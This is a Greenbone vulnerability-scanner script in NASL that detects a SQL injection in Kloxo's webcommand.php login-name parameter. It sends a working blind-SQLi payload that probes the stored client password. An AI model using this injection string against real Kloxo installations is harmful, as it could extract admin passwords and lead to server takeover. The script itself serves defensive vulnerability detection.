# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:lxcenter:kloxo";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103976");
  script_version("2025-08-12T05:40:06+0000");
  script_tag(name:"last_modification", value:"2025-08-12 05:40:06 +0000 (Tue, 12 Aug 2025)");
  script_tag(name:"creation_date", value:"2014-02-22 22:53:14 +0700 (Sat, 22 Feb 2014)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");

  script_cve_id("CVE-2014-125124");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Kloxo SQLi and RCE Vulnerability");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_lxcenter_kloxo_detect.nasl");
  script_require_ports("Services/www", 7778);
  script_mandatory_keys("Kloxo/installed");

  script_tag(name:"summary", value:"Kloxo is prone to SQL injection (SQLi) and remote code
  execution (RCE) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Checks if webcommand.php is available and if a basic SQL
  injection can be conducted.");

  script_tag(name:"insight", value:"The vulnerability is in /lbin/webcommand.php where the
  parameter login-name is not properly sanitized and allow a SQL Injection.");

  script_tag(name:"impact", value:"An unauthenticated remote attacker can retrieve data from the
  database like e.g. the admin cleartext password and might use this for further attacks like
  code execution in the Command Center function.");

  script_tag(name:"affected", value:"LxCenter Kloxo Version 6.1.12 and possible prior.");

  script_tag(name:"solution", value:"Update to version 6.1.13 or later.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20140301125222/http://www.webhostingtalk.com/showthread.php?p=8996984");
  script_xref(name:"URL", value:"https://web.archive.org/web/20141118054734/https://vpsboard.com/topic/3384-kloxo-installations-compromised/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/31577");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("url_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/lbin/webcommand.php";
req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req );
if( isnull( res ) )
  exit( 0 );

# If webcommands don't exist it is not vulnerable
if( ! ereg( string:res, pattern:"__error_only_clients_and_auxiliary_allowed_to_login", multiline:TRUE ) )
  exit( 0 );

url += "?login-class=client&login-name=";
sqli = string("al5i' union select '$1$Tw5.g72.$/0X4oceEHjGOgJB/fqRww/' from client where");
sqli += string(" ascii(substring(( select realpass from client limit 1),1,1))=68#");
sqli += "&login-password=123456";
sqli = urlencode(str:sqli);
url += sqli;

req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req );
if( ! ereg( string:res, pattern:"_error_login_error", multiline:TRUE ) ) {
  exit( 99 );
} else {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}
